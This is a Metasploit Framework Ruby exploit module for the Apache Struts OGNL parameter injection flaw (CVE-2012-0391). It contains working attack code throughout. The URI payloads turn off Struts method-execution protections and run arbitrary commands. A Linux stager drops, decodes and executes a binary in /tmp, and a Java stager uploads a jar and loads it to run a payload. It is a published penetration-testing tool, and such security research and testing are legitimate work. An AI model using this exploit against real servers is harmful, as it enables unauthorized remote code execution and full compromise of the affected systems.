##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apache Struts <= 2.2.1.2 Remote Command Execution',
			'Description'    => %q{
				This module exploits a remote command execution vulnerability in
				Apache Struts versions < 2.2.1.2. This issue is caused because the
				ParametersInterceptor allows for the use of parentheses which allows it to interpret
				parameter values as OGNL expressions during certain exception handling for mismatched
				data types of properties which allows remote attackers to execute arbitrary Java code
				via a crafted parameter.
			},
			'Author'         =>
				[
					"Richard Hicks", # Metasploit Module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-0391'],
					[ 'OSVDB', '78277'],
					[ 'EDB', '18329'],
					[ 'URL', 'https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt']
				],
			'Platform'      => [ 'win', 'linux', 'java'],
			'Privileged'     => true,
			'Targets'        =>
				[
					['Linux Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						}
					],
					[ 'Java Universal',
						{
								'Arch' => ARCH_JAVA,
								'Platform' => 'java'
						},
					]
				],
			'DisclosureDate' => 'Jan 06 2012',
			'DefaultTarget' => 1))

			register_options(
				[
					Opt::RPORT(8080),
					OptString.new('PARAMETER',[ true, 'The parameter to perform injection against.',"username"]),
					OptString.new('TARGETURI', [ true, 'The path to a struts application action with the location to perform the injection i.e. /blank-struts2/login.action?INJECT', "/blank-struts2/login.action?INJECT"]),
					OptString.new('CMD', [ false, 'Execute this command instead of using command stager', "" ])
				], self.class)
	end

	def execute_command(cmd, opts = {})

		uri = String.new(datastore['TARGETURI'])
		uri.gsub!(/INJECT/, "REPLACEMETOKEN=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean(false),%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean(true),%20CMD)('meh')&z[(REPLACEMETOKEN)(meh)]=true") if target['Platform'] == 'java'
		uri.gsub!(/INJECT/, "REPLACEMETOKEN=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean(false),%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean(true),%20@java.lang.Runtime@getRuntime().exec(\"CMD\".split(\"@\")))(meh)&z[(REPLACEMETOKEN)(%27meh%27)]=true") if target['Platform'] == 'linux'
		uri.gsub!(/REPLACEMETOKEN/,Rex::Text::uri_encode(datastore['Parameter']))
		uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))
		puts uri
		#print_status("URI: #{uri}")
		#print_status("Attempting to execute: #{cmd}")

		resp = send_request_cgi({
			'uri'     => uri,
			'version' => '1.1',
			'method'  => 'GET',
		}, 15)

		if resp.nil?
			print_status("Target is not responding")
		end

	end

	def linux_stager
	cmds = "/bin/sh@-c@echo LINE | tee FILE"
	exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
	base64 = Rex::Text.encode_base64(exe)
	base64.gsub!(/\=/, "\\u003d")
	file = rand_text_alphanumeric(4+rand(4))

	execute_command("/bin/sh@-c@touch /tmp/#{file}.b64")
	cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
	base64.each_line do |line|
		line.chomp!
	cmd = cmds
	cmd.gsub!(/LINE/, line)
	execute_command(cmds)
	end

		execute_command("/bin/sh@-c@base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
		execute_command("/bin/sh@-c@chmod +x /tmp/#{file}")
		execute_command("/bin/sh@-c@rm /tmp/#{file}.b64")

		execute_command("/bin/sh@-c@/tmp/#{file}")
		@payload_exe = "/tmp/" + file
	end

	def java_upload_part(part, filename, append = 'false')
		cmd = ""
		cmd << "#f=new java.io.FileOutputStream('#{filename}',#{append}),"
		cmd << "#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),"
		cmd << "#f.close()"
		execute_command(cmd)
	end

	def java_stager
		@payload_exe = rand_text_alphanumeric(4+rand(4)) + ".jar"
		append = 'false'
		jar = payload.encoded_jar.pack

		chunk_length = 384 #512 bytes when base64 encoded

		while(jar.length > chunk_length)
			java_upload_part(jar[0,chunk_length], @payload_exe, append)
			jar = jar[chunk_length, jar.length - chunk_length]
			append='true'
		end
		java_upload_part(jar,@payload_exe, append)

		cmd = ""
		# disable vararg handling (since it is buggy in ognl used by struts 2.1
		cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),"
		cmd << "#q.setAccessible(true),#q.set(null,true),"
		cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),"
		cmd << "#q.setAccessible(true),#q.set(null,false),"
		# create classloader
		cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}').toURI().toURL()}),"
		# load class
		cmd << "#c=#cl.loadClass('metasploit.Payload'),"
		#invoke main
		cmd << "#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke("
		cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
		execute_command(cmd)
	end

	def check
		uri = String.new(datastore['TARGETURI'])
		uri.gsub!(/INJECT/, "=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean(false),%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean(true),%20@java.lang.Thread@sleep(10000))(meh)&z[(REPLACEMETOKEN)(%27meh%27)]=true")
		uri.gsub!(/REPLACEMETOKEN/,Rex::Text::uri_encode(datastore['Parameter']))

		t1 = Time.now
		response = send_request_cgi({
			'uri' => uri,
			'version' => '1.1',
			'method' => 'GET',
		},15)
		t2 = Time.now
		delta = t2 - t1


		if response.nil?
			return Exploit::CheckCode::Safe
		elsif delta < 10
			puts "less than 10"
			return Exploit::CheckCode::Safe
		else
			return Exploit::CheckCode::Appears
		end
	end

	def exploit
		case target['Platform']
		when 'linux'
			linux_stager
		when 'java'
			java_stager
		else
			fail_with(Exploit::Failure::NoTarget, 'Unsupported target platform!')
		end
		print_status("Executing user supplied command")
	end
end
